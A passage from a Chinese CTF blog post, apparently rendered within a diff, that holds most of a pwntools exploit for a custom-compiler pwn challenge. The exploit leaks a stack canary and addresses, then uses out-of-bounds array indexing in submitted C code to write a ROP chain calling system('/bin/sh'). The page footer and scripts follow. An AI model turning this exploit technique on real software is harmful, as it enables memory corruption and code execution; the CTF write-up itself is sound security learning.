class="number">0x100</span></span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;canary_stack &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(canary_stack))</span><br><span class="line"></span><br><span class="line">canary_stacks = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    canary_stacks.append((canary_stack&gt;&gt;(<span class="number">8</span>*i)) % <span class="number">256</span>)</span><br><span class="line"><span class="built_in">print</span>(canary_stacks)</span><br><span class="line"></span><br><span class="line">bss_addrs = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    bss_addrs.append((bss_addr&gt;&gt;(<span class="number">8</span>*i)) % <span class="number">256</span>)</span><br><span class="line"><span class="built_in">print</span>(bss_addrs)</span><br><span class="line"></span><br><span class="line">systems = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    systems.append((system&gt;&gt;(<span class="number">8</span>*i)) % <span class="number">256</span>)</span><br><span class="line"><span class="built_in">print</span>(systems)</span><br><span class="line"></span><br><span class="line">pop_rdis = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    pop_rdis.append((pop_rdi&gt;&gt;(<span class="number">8</span>*i)) % <span class="number">256</span>)</span><br><span class="line"><span class="built_in">print</span>(pop_rdis)</span><br><span class="line"></span><br><span class="line">code = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">int main()&#123;</span></span><br><span class="line"><span class="string">	cat ./flag;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">cmd(<span class="number">4</span>)	</span><br><span class="line">sla(<span class="string">&quot;input code:&quot;</span>,code)</span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">binsh = heap_base +<span class="number">0x199fe</span></span><br><span class="line">binshs = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    binshs.append((binsh&gt;&gt;(<span class="number">8</span>*i)) % <span class="number">256</span>)</span><br><span class="line"><span class="built_in">print</span>(binshs)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">code = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">int main()&#123;</span></span><br><span class="line"><span class="string">	int arr[255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255];</span></span><br><span class="line"><span class="string">    arr[%s][%s][%s][%s][%s][%s][%s][%s][%s][%s][%s][%s][%s][%s][%s][%s][%s][%s][%s][%s][%s][%s][%s][%s][0][0][0][0][0][0][0][0][%s][%s][%s][%s][%s][%s][%s][%s][%s][%s][%s][%s][%s][%s][%s][%s][255][255][255][255][255][255]=0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span> % (systems[<span class="number">7</span>],systems[<span class="number">6</span>],systems[<span class="number">5</span>],systems[<span class="number">4</span>],</span><br><span class="line">       systems[<span class="number">3</span>],systems[<span class="number">2</span>],systems[<span class="number">1</span>],systems[<span class="number">0</span>],</span><br><span class="line">       binshs[<span class="number">7</span>],binshs[<span class="number">6</span>],binshs[<span class="number">5</span>],binshs[<span class="number">4</span>],</span><br><span class="line">       binshs[<span class="number">3</span>],binshs[<span class="number">2</span>],binshs[<span class="number">1</span>],binshs[<span class="number">0</span>],</span><br><span class="line">       pop_rdis[<span class="number">7</span>],pop_rdis[<span class="number">6</span>],pop_rdis[<span class="number">5</span>],pop_rdis[<span class="number">4</span>],</span><br><span class="line">       pop_rdis[<span class="number">3</span>],pop_rdis[<span class="number">2</span>],pop_rdis[<span class="number">1</span>],pop_rdis[<span class="number">0</span>],</span><br><span class="line">       canary_stacks[<span class="number">7</span>],canary_stacks[<span class="number">6</span>],canary_stacks[<span class="number">5</span>],canary_stacks[<span class="number">4</span>],</span><br><span class="line">       canary_stacks[<span class="number">3</span>],canary_stacks[<span class="number">2</span>],canary_stacks[<span class="number">1</span>],canary_stacks[<span class="number">0</span>],</span><br><span class="line">       bss_addrs[<span class="number">7</span>],bss_addrs[<span class="number">6</span>],bss_addrs[<span class="number">5</span>],bss_addrs[<span class="number">4</span>],</span><br><span class="line">       bss_addrs[<span class="number">3</span>],bss_addrs[<span class="number">2</span>],bss_addrs[<span class="number">1</span>],bss_addrs[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">cmd(<span class="number">4</span>)	</span><br><span class="line">sla(<span class="string">&quot;input code:&quot;</span>,code)</span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>出这个题目之前正好在学编译原理，我当时在做编译器 Lab 的时候就遇到了溢出的相关问题，于是就干脆把我做 Lab 时写的编译器拿出来改了改，弄了个 pwn 出来</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/Compilers-Principles/" rel="tag"><i class="fa fa-tag"></i> Compilers Principles</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/06/20/VM%20pwn+%E5%A0%86%E6%BA%A2%E5%87%BA/" rel="prev" title="VM pwn+堆溢出">
+      <i class="fa fa-chevron-left"></i> VM pwn+堆溢出
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2023/06/21/SycLang%E5%87%BA%E9%A2%98%E6%80%9D%E8%B7%AF/" rel="next" title="SycLang出题思路">
+      SycLang出题思路 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="yhellow"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">yhellow</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">266</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">144</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2019 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">yhellow</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="Symbols count total">3.6m</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="Reading time total">54:03</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
